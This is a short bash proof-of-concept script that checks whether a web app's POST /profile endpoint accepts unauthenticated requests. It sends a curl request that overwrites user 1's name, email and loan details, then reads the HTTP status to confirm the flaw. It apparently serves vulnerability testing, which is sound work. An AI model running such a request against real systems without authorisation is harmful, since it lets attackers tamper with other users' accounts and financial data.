#!/bin/bash

# POC: Unauthenticated Profile Access
# This script demonstrates that the POST /profile endpoint processes requests
# without proper authentication validation, allowing unauthenticated users
# to modify profiles.

TARGET_URL="${1:-http://localhost:5000}"
PROFILE_ENDPOINT="$TARGET_URL/profile"

echo "[*] Testing unauthenticated POST request to $PROFILE_ENDPOINT"
echo ""

# Step 1: Send unauthenticated POST request with profile modification data
echo "[*] Sending POST request WITHOUT authentication cookie..."
RESPONSE=$(curl -s -w "\n%{http_code}" -X POST "$PROFILE_ENDPOINT" \
  -d "user_id=1&name=UnAuthUser&lastname=Attacker&email=hacked@test.com&loan_amount=999999&loan_term_months=120&monthly_payment=9999" \
  -H "Content-Type: application/x-www-form-urlencoded")

# Extract HTTP status code (last line)
HTTP_STATUS=$(echo "$RESPONSE" | tail -n1)
RESPONSE_BODY=$(echo "$RESPONSE" | head -n-1)

echo "[*] HTTP Status Code: $HTTP_STATUS"
echo ""

# Step 2: Analyze response
if [ "$HTTP_STATUS" == "302" ] || [ "$HTTP_STATUS" == "200" ]; then
  echo "[+] SUCCESS: Request was accepted (HTTP $HTTP_STATUS)"
  echo "[+] VULNERABILITY CONFIRMED: POST endpoint accepted unauthenticated request"
  echo ""
  echo "[*] Response headers/body:"
  echo "$RESPONSE_BODY"
  echo ""
  echo "[+] The endpoint did NOT return 401 Unauthorized or 403 Forbidden"
  echo "[+] This confirms missing authentication validation on POST /profile"
  exit 0
elif [ "$HTTP_STATUS" == "401" ] || [ "$HTTP_STATUS" == "403" ]; then
  echo "[-] Request was rejected with HTTP $HTTP_STATUS"
  echo "[-] Authentication appears to be properly enforced"
  exit 1
else
  echo "[!] Unexpected HTTP status: $HTTP_STATUS"
  echo "[*] Response:"
  echo "$RESPONSE_BODY"
  exit 2
fi